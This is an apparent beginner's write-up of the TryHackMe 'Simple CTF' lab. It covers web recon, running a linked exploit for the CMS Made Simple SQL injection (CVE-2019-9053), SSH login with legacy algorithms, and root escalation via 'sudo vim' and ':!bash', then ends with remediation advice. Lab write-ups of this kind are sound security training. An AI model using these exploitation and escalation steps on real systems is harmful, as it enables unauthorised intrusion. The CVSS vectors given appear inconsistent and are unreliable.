Tryhackme:SimpleCTF Write-up

This write-up actual on 2026/01/06
https://tryhackme.com/room/easyctf

First Recon

<img width="765" height="606" alt="изображение" src="https://github.com/user-attachments/assets/7e1c476f-5ffc-472b-8e74-5c1fe1288ca7" />

Nmap scanning

WEB Recon

<img width="1280" height="696" alt="изображение" src="https://github.com/user-attachments/assets/17e120bf-dcea-461f-9ee9-b4aae6658e26" />

This base path on ip

Use the(/FUZZ/gobuster/nikto) to looking around in site use worldlist for destination detection
i am use nikto and find only /simple without /admin

<img width="1280" height="696" alt="изображение" src="https://github.com/user-attachments/assets/581d5057-5478-45cf-b45e-a9a38ead2e46" />


Cms base path

<img width="1280" height="696" alt="изображение" src="https://github.com/user-attachments/assets/25d93581-2ff5-46c9-820d-760fbb22ddb0" />


Admin login

Then we need to use CVE:2019-9053 BUT this python2 script for my and you dont work properly i give you worked version for my python3 on kali this work

	Usage : python3 46635.py -u http://10.81.170.225/simple
https://github.com/Sacramar/Pentest-tools/blob/main/CVE-2019%E2%80%939053%20(python3%20version)

<img width="497" height="101" alt="изображение" src="https://github.com/user-attachments/assets/db6d339d-a51d-4d4c-a820-25f81877fbcf" />

We found

Password.password salt.name
|email <—-dont needed

Connecting to ssh

<img width="844" height="431" alt="изображение" src="https://github.com/user-attachments/assets/572ef5b0-3558-4bee-b09e-caea1cff74dd" />

This 2 think how dont work properly for me and you because OpenSSh on server older then me and you use next comand for fix it

	ssh -p 2222 \
	-o KexAlgorithms=diffie-hellman-group14-sha1 \
	-o HostKeyAlgorithms=ssh-rsa \
	-o PubkeyAcceptedAlgorithms=ssh-rsa \
	mitch@10.82.158.249

Finding Flags and Prvilage escalation

<img width="482" height="64" alt="изображение" src="https://github.com/user-attachments/assets/88c601ba-c0a9-4489-8393-bd0312f6c8c2" />

	$ ls
	user.txt
	$ cat user.txt 

	$ id
	$ whoami
	mitch
	$ sudo -l
User mitch may run the following commands on Machine:
 (root) NOPASSWD: /usr/bin/vim

	$ sudo vim

Use in vim tap “:” with shift button and start texting !bash and tap Enter
We been root user

	cd root
	root@Machine:/root# cat root.txt
**Found vulnerability**  
	http://10.82.158.249/simple/  
	CMS Made simple  
	CVE:2019-9053 CMS Made Simple up to 2.2.8 News m1_idlist Time-Based sql injection  
	CVSS v4.0 Score: 7.3 / High   
	CVSS:4.0/AV:L/AC:H/AT:P/PR:L/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H/E:P/MAV:L/MAC:H/MAT:P/MPR:L/MUI:N/AU:N/V:D/RE:H  
Found admin user credentinals from cms admin path login and SSH login form  

**Vim GTFOBins exploit**  CVSS v4.0 Score: 8.8 / High ⊕ CVSS v4.0 Score: 8.8  
	CVSS:4.0/AV:L/AC:H/AT:P/PR:L/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H/E:A/MAV:L/MAC:H/MAT:P/MPR:L/MUI:N/AU:N/V:D/RE:H  
Get root user  

**Recommendations for correction**  
CVE-2019-9053 (SQL Injection in CMS Made Simple) "Immediately update the CMS to the latest version. As a temporary measure, configure the Web Application Firewall (WAF) to block SQL injections."  

Deprecated SSH algorithm (hmac-sha1)  "In the /etc/ssh/sshd_config file, allow only hmac-sha2-256 and newer algorithms."  

Privilege escalation via sudo vim → "Remove user from sudo group or restrict allowed commands in sudoers using visudo."  
  
**P.S**
And we done machine thanks for reading this me first write-up i wrote them because other is so old and dont helpful
